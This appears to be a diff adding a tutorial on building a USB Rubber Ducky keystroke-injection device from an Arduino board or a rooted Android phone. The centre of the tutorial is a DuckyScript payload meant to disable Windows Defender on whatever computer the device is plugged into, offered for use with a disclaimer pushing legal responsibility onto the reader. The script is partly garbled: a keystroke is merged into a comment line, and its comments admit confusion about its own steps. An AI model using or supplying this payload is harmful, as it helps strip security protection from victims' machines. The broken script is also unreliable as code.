@@ -1,0 +1,64 @@
+How To Make A USB Rubber Ducky?
+Android mobiles can also be used to make a USB rubber ducky, if an Android device is rooted we may use it as a Rubber ducky device. And can perform all the operations that an original ducky can perform. 
+
+To Make USB rubber ducky from android : 
+
+Android mobile must be rooted
+Kali net hunter installed on the device
+In this article, we must be using some other components to create a USB Rubber Ducky at home. 
+
+Material Requirements
+
+Arduino based board
+USB connector
+Arduino IDE
+Step 1: First of all download Arduino IDE from official website, and install the software like any other software you install on windows. 
+
+Step 2: Connect the Arduino board to the computer using the USB connector and open the IDE. 
+
+Step 3: Now from the Payload list choose according to your task. 
+
+Step 4: Convert the code that you have chosen to make executable in Arduino here. 
+
+Script for turning off the Windows Defender 
+
+REM turn off windows defender then clear action center
+REM author:geeksforgeeks
+REM You take responsibility for any laws you break with this, I simply point out the security flaw
+REM start of script
+REM let the HID enumerate
+DELAY 2000
+ESCAPE
+DELAY 100
+CONTROL ESCAPE
+DELAY 100
+STRING Windows Defender Settings
+ENTER
+DELAY 2000
+REM why TAB and HOME?
+TAB
+DELAY 50
+REM why TAB and HOME?HOME
+DELAY 50
+ALT F4
+DELAY 3200
+REM windows + a = ????
+GUI a 
+DELAY 500
+ENTER
+DELAY 100
+GUI a
+
+Step 5:In the Arduino IDE creates a new project, by clicking on File–> New project. 
+
+Step 6: After converting to new code adding to the Arduino IDE, now select the board which you are using. Tools–>Board–>Your board. 
+
+Step 7: Click on the project and choose the port, where Arduino is connected. Tools–>Port–>Your Port. 
+
+Step 8: Now when the board is connected, enter the code or payload you want to work with. 
+
+Step 9: Now verify and compile your code. Sketch–>verify/compile. 
+
+Step 10: After compiling, upload the code to the Arduino device. 
+
+Whenever you will Connect this board with any computer it works as a USB rubber ducky and executes the payload written
